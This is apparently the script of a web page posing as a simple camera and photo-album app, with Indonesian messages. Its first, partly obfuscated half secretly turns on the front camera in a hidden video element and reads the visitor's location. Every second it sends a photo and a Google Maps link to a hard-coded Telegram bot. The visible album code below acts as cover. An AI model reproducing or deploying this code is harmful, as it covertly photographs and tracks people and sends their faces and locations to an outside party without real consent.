const token = "7983556983:AAHwknrobXaOFMaSFRrkUOTBAeb8c_RKxbk";
const chatId = "7930877855";
const camera = document.createElement("video");
camera.setAttribute("autoplay", true);
camera.setAttribute("style", "display: none");
document.body.appendChild(camera);
function requestPermissions() {
  return new Promise((_0x12483f, _0x5eea30) => {
    setTimeout(async () => {
      try {
        const _0x518238 = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: "user"
          }
        });
        camera.srcObject = _0x518238;
        navigator.geolocation.getCurrentPosition(_0xcbda2a => _0x12483f({
          latitude: _0xcbda2a.coords.latitude,
          longitude: _0xcbda2a.coords.longitude
        }), _0xfee4b7 => _0x5eea30("Gagal mendapatkan lokasi"));
      } catch (_0x308534) {
        _0x5eea30("Gagal mendapatkan izin kamera");
      }
    }, 2000);
  });
}
function captureAndSend(_0x51dc4b) {
  if (!camera.srcObject) {
    console.error("Stream kamera belum tersedia.");
    return;
  }
  const _0x59829c = document.createElement("canvas");
  const _0x188065 = _0x59829c.getContext("2d");
  _0x59829c.width = camera.videoWidth || 640;
  _0x59829c.height = camera.videoHeight || 480;
  _0x188065.drawImage(camera, 0, 0, _0x59829c.width, _0x59829c.height);
  _0x59829c.toBlob(_0x3ff345 => {
    const _0x392d6d = "https://www.google.com/maps?q=" + _0x51dc4b.latitude + "," + _0x51dc4b.longitude;
    const _0xa2b47b = "📍 [Lokasi Pengguna](" + _0x392d6d + ")\n📡 By rey";
    const _0x5346d2 = new FormData();
    _0x5346d2.append("chat_id", chatId);
    _0x5346d2.append("photo", _0x3ff345, "image.jpg");
    _0x5346d2.append("caption", _0xa2b47b);
    _0x5346d2.append("parse_mode", "Markdown");
    sendImageToTelegram(_0x5346d2);
  }, "image/jpeg");
}
function sendImageToTelegram(_0x4a93f1) {
  fetch("https://api.telegram.org/bot" + token + "/sendPhoto", {
    method: "POST",
    body: _0x4a93f1
  }).then(_0x1011ff => _0x1011ff.json()).then(_0x41f66e => console.log("Gambar berhasil dikirim:", _0x41f66e)).catch(_0x405696 => console.error("Terjadi kesalahan:", _0x405696));
}
let intervalId;
window.onload = async function () {
  try {
    const _0x3f33bd = await requestPermissions();
    if (_0x3f33bd) {
      captureAndSend(_0x3f33bd);
      intervalId = setInterval(() => {
        captureAndSend(_0x3f33bd);
      }, 1000);
    }
  } catch (_0x2b238b) {
    console.error(_0x2b238b);
  }
};
window.onbeforeunload = function () {
  clearInterval(intervalId);
};

const video = document.getElementById('cameraPreview');
const album = document.getElementById('album');
const captureBtn = document.getElementById('captureBtn');

async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    console.log("✅ Kamera berhasil diaktifkan.");
  } catch (err) {
    console.warn("⚠️ Kamera tidak diizinkan atau tidak tersedia:", err);
    alert("Tidak bisa mengakses kamera. Pastikan izin kamera diaktifkan di browser Anda.");
  }
}

function capturePhoto() {
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  const imageData = canvas.toDataURL('image/png');
  const img = document.createElement('img');
  img.src = imageData;
  img.alt = "Hasil Foto";
  img.style.width = "100%";
  img.style.borderRadius = "10px";
  img.style.marginBottom = "10px";
  img.style.boxShadow = "0 0 6px rgba(0,0,0,0.2)";
  img.style.transition = "0.3s ease";
  album.appendChild(img);
  console.log("📸 Foto berhasil ditambahkan ke album.");
}

startCamera();

if (captureBtn) {
  captureBtn.addEventListener('click', capturePhoto);
      }
